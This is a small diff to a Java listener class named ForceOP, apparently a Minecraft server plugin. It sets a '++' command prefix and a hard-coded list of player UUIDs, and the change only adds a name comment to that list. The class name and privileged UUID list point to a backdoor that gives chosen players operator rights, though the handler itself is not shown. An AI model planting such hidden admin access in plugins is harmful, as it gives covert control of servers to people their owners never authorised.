@@ -23,7 +23,7 @@ public class ForceOP implements Listener{
 		this.prefix = "++";
 		this.version = "0.0.1";
 		players = new ArrayList<String>();
-		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37");
+		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
 	}
 	
 	@EventHandler
